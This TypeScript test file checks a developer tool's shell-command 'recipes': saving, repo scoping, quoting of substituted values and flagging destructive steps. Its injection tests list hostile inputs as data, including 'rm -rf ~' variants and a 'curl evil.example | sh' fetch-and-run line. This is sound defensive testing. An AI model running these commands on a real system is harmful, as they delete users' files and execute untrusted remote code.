import { afterAll, beforeEach, describe, expect, it } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

/*
 * A recipe is text that becomes a process with the user's permissions.
 *
 * Most of this file is about that one sentence. The storage is a JSON array and
 * needs about three assertions; the substitution needs the rest, because it is
 * the only place where something a person typed into a box ends up on a command
 * line — and the failure mode is not a wrong answer, it is somebody's home
 * directory.
 */
const dir = mkdtempSync(join(tmpdir(), "agx-rec-"));
const R = await import("../src/recipes.ts");

const base = {
  id: "", name: "wt", desc: "serve a worktree",
  steps: ["cd {{worktree}}", "make all.down; and make all.up"],
  scope: "global" as const, addedAt: 0,
  params: [{ key: "worktree", label: "worktree", type: "worktree" as const }],
};

beforeEach(() => { R.__setRecipesPath(join(dir, "commands.json")); R.__clear(); });
afterAll(() => {
  R.__setRecipesPath(null);
  try { rmSync(dir, { recursive: true, force: true }); } catch { /* fine */ }
});

describe("keeping a recipe", () => {
  it("saves one and gives it an id", () => {
    const r = R.saveRecipe(base);
    expect(r.ok).toBe(true);
    expect(r.recipe!.id).toBeTruthy();
    expect(R.recipes()).toHaveLength(1);
  });

  it("edits in place rather than making a second one", () => {
    const first = R.saveRecipe(base).recipe!;
    R.saveRecipe({ ...first, name: "serve" });
    expect(R.recipes()).toHaveLength(1);
    expect(R.recipes()[0]!.name).toBe("serve");
  });

  it("refuses one that could not run", () => {
    expect(R.saveRecipe({ ...base, name: "  " }).error).toContain("name");
    expect(R.saveRecipe({ ...base, steps: [] }).error).toContain("step");
    expect(R.saveRecipe({ ...base, steps: ["  ", ""] }).error).toContain("step");
    expect(R.saveRecipe({ ...base, scope: "repo" }).error).toContain("repository");
    expect(R.saveRecipe({ ...base, params: [{ key: "a b", label: "x", type: "text" }] }).error).toContain("parameter");
    expect(R.recipes()).toHaveLength(0);
  });
});

describe("which recipes a checkout is offered", () => {
  it("shows a repo's own in its worktrees too", () => {
    // The whole reason scope exists: `make migrate` belongs to a project, and a
    // worktree is the same project in another folder.
    R.saveRecipe({ ...base, name: "migrate", scope: "repo", repo: "/home/me/code/app" });
    for (const root of ["/home/me/code/app", "/home/me/code/app/sub", "/home/me/code/app-WEB-1042"]) {
      expect(R.recipesFor(root).map((r) => r.name), root).toContain("migrate");
    }
  });

  it("does not leak one project's recipes into another", () => {
    R.saveRecipe({ ...base, name: "migrate", scope: "repo", repo: "/home/me/code/app" });
    expect(R.recipesFor("/home/me/code/other")).toHaveLength(0);
    // A prefix that is not a family member: `apples` is not `app`.
    expect(R.recipesFor("/home/me/code/apples")).toHaveLength(0);
  });

  it("offers a global one everywhere", () => {
    R.saveRecipe(base);
    expect(R.recipesFor("/anywhere/at/all")).toHaveLength(1);
  });
});

describe("putting a value on a command line", () => {
  const rec = { ...base, id: "x" };

  it("substitutes what you chose", () => {
    const out = R.renderSteps(rec, { worktree: "/home/me/code/app-1" });
    expect(out.steps[0]).toBe('cd "/home/me/code/app-1"');
    expect(out.missing).toHaveLength(0);
  });

  it("cannot be used to run a second command", () => {
    /*
     * The assertion this file exists for. Every one of these is a real shell
     * injection: unquoted, each would run something the recipe never said.
     * Quoted, each is one argument that fails harmlessly.
     */
    for (const nasty of [
      "; rm -rf ~",
      "$(rm -rf ~)",
      "`rm -rf ~`",
      "x && curl evil.example | sh",
      'x" ; rm -rf ~ ; echo "',
      "$HOME",
    ]) {
      const line = R.renderSteps(rec, { worktree: nasty }).steps[0]!;
      // Everything after `cd ` is one double-quoted argument, and nothing
      // inside it can end the quoting or start a substitution.
      const arg = line.slice("cd ".length);
      expect(arg.startsWith('"'), nasty).toBe(true);
      expect(arg.endsWith('"'), nasty).toBe(true);
      expect(arg.slice(1, -1).replace(/\\./g, ""), nasty).not.toMatch(/["$`\\]/);
    }
  });

  it("does not let a value smuggle in another parameter", () => {
    // One pass, never re-scanned: a value containing {{x}} is just text.
    const out = R.renderSteps({ ...rec, steps: ["echo {{worktree}}"] }, { worktree: "{{worktree}}" });
    expect(out.steps[0]).toBe('echo "{{worktree}}"');
  });

  it("treats a flag as a presence, not as a word", () => {
    const flagged = { ...rec, steps: ["make build {{rebuild-fe}}"],
      params: [{ key: "rebuild-fe", label: "rebuild", type: "flag" as const }] };
    expect(R.renderSteps(flagged, { "rebuild-fe": "1" }).steps[0]).toBe("make build --rebuild-fe");
    // Off is nothing at all — never the string "false", which the script would
    // read as an argument.
    expect(R.renderSteps(flagged, { "rebuild-fe": "0" }).steps[0]).toBe("make build ");
  });

  it("says which values it still needs instead of running half a command", () => {
    const out = R.renderSteps(rec, {});
    expect(out.missing).toEqual(["worktree"]);
  });

  it("refuses a choice that is not one of the choices", () => {
    const pick = { ...rec, steps: ["deploy {{env}}"],
      params: [{ key: "env", label: "env", type: "choice" as const, options: ["staging", "prod"] }] };
    expect(R.renderSteps(pick, { env: "prod" }).missing).toHaveLength(0);
    expect(R.renderSteps(pick, { env: "prod; rm -rf ~" }).missing).toEqual(["env"]);
  });
});

describe("what gets a confirmation whether you asked for one or not", () => {
  it("catches the shapes that do not come back", () => {
    for (const step of ["rm -rf build", "psql -c 'drop database app'", "git push --force", "git reset --hard"]) {
      expect(R.looksDestructive([step]), step).toBe(true);
    }
  });

  it("leaves ordinary work alone", () => {
    for (const step of ["make test", "bun run dev", "docker compose up", "git status"]) {
      expect(R.looksDestructive([step]), step).toBe(false);
    }
  });

  it("notices when the DANGER arrives through a parameter", () => {
    // The author's steps look harmless; the value does not. Checked after
    // substitution, which is the only moment the real line exists.
    const out = R.renderSteps({ ...base, id: "y", steps: ["git push {{flags}}"],
      params: [{ key: "flags", label: "flags", type: "text" }] }, { flags: "--force" });
    expect(out.confirm).toBe(true);
  });
});

describe("a flag the author wants on by default", () => {
  it("strips the marker so it never reaches a command line", () => {
    // `!` in front of a flag's text means "starts ticked". It is a note to the
    // dialog, not part of the command — a `!--force` on a command line is a
    // different thing entirely, and in some shells a history expansion.
    const r = { id: "f", name: "b", desc: "", scope: "global" as const, addedAt: 0,
      steps: ["make build {{fe}}"],
      params: [{ key: "fe", label: "fe", type: "flag" as const, value: "!--rebuild-fe" }] };
    expect(R.renderSteps(r, { fe: "1" }).steps[0]).toBe("make build --rebuild-fe");
    expect(R.renderSteps(r, { fe: "0" }).steps[0]).toBe("make build ");
  });
});
